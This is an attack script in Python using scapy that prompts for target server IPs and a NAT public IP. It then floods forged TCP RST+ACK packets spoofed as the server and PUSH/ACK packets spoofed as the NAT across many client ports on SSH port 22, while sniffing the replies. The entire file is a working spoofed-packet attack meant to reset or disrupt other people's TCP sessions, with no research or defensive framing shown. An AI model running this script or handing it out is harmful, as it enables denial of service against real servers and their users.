#!/usr/bin/env python3

from scapy.all import *
import threading
import random
import time

iface = "eno1"  
default_client_port_range = (30000, 60000)

dport=22
def rand_seq():
    return random.randint(0, 0xFFFFFFFF)

def parse_ports(input_str, default_range):
    if not input_str.strip():
        return list(range(default_range[0], default_range[1], 1000))
    try:
        return [int(p.strip()) for p in input_str.split(',')]
    except ValueError:
        print("[!] Invalid port format. Using default range.")
        return list(range(default_range[0], default_range[1]))

def parse_ips(input_str):
    return [ip.strip() for ip in input_str.split(',') if ip.strip()]

def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        print(f"[+] Captured Packet: {pkt.summary()}")
        pkt.show()

def attack_server(nat_ip, server_ip, server_port, client_src_port):
    print(f"\n[*] Thread started: {server_ip}:{server_port} <- {client_src_port}")

    # Stage 1: Send forged RST+ACK to NAT/client side
    rst_ack_pkt = IP(src=server_ip, dst=nat_ip) / \
                  TCP(sport=server_port, dport=client_src_port, flags="RA", seq=rand_seq(), ack=rand_seq())
    send(rst_ack_pkt, count=5, inter=0.2, verbose=0)
    print(f"  [>] Sent forged RST+ACK to NAT from {server_ip}:{server_port} -> {nat_ip}:{client_src_port}")

    # Stage 2: Manipulate TCP state on server
    push_ack_pkt = IP(src=nat_ip, dst=server_ip) / \
                   TCP(sport=client_src_port, dport=server_port, flags="PA",
                       seq=rand_seq(), ack=rand_seq())
    send(push_ack_pkt, count=5, inter=0.2, verbose=0)
    print(f"  [>] Sent PUSH/ACK to Server from {nat_ip}:{client_src_port} -> {server_ip}:{server_port}")

# ======= MAIN PROGRAM =======
try:
    server_ips = parse_ips(input("Provide the list of server IPs (comma-separated): "))
    if not server_ips:
        print("[!] No server IPs provided. Exiting.")
        exit(1)

    client_ports = parse_ports(input("Client ports to try (comma-separated, optional): "), default_client_port_range)

   # server_dports = parse_ports(input("Destination ports for each server (comma-separated): "), [443, 444])
   # if len(server_dports) != len(server_ips):
    #    print("[!] Mismatch in number of server IPs and ports. Using default port 443 for all.")
     #   server_dports = [443] * len(server_ips)

    nat_ip = input("NAT IP (public IP visible to server): ").strip()
    if not nat_ip:
        print("[!] NAT IP is required. Exiting.")
        exit(1)

except KeyboardInterrupt:
    print("\n[!] User aborted input.")
    exit(1)
    
print("[*] Starting packet sniffer...")
sniffer = AsyncSniffer(
    iface=iface,
    filter=f"tcp and (host {' or host '.join(server_ips)} or host {nat_ip})",
    prn=packet_callback,
    store=True
)
sniffer.start()
time.sleep(2)

threads = []
for idx, server_ip in enumerate(server_ips):
    server_port = dport
    for client_port in client_ports:
        t = threading.Thread(target=attack_server, args=(nat_ip, server_ip, server_port, client_port))
        t.start()
        threads.append(t)

for t in threads:
    t.join()

sniffer.stop()
print("\n[*] All attacks completed. Sniffing stopped.")

